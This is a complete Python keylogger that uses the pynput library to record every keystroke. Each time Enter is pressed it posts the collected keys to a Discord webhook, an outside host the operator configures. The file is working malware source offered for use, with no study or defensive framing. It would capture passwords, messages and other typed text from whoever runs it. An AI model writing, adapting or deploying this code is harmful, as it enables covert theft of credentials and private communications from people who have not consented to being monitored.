from pynput import keyboard
import requests
import json
import sys

# Enter your webhook URL here
webhook_url = 'your_webhook_url'

def send_to_discord(message):
    # Send the message to the webhook URL
    data = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
    if response.status_code != 204:
        print('Webhook sending error:', response.text)

# Create a list to store keystrokes
keystrokes_list = []

# Define a function to capture keyboard strokes
def print_keystroke(key):
    # Get the character of the pressed key
    key_char = None
    try:
        key_char = key.char
    except AttributeError:
        pass

    # If the key has a character or is not the Enter key, add it to the list
    if key_char:
        key_text = key_char
    else:
        key_text = str(key)

    keystrokes_list.append(key_text)

    # If the Enter key is pressed, join the list and send it to Discord
    if key == keyboard.Key.enter:
        send_to_discord(' '.join(keystrokes_list))
        keystrokes_list.clear()
    # If the 'q' key is pressed, stop the program
    elif key_char == 'q':
        keyboard_listener.stop()
        sys.exit()

# Start the event handler
keyboard_listener = keyboard.Listener(on_press=print_keystroke)
keyboard_listener.start()

# Wait for the program to run
keyboard_listener.join()
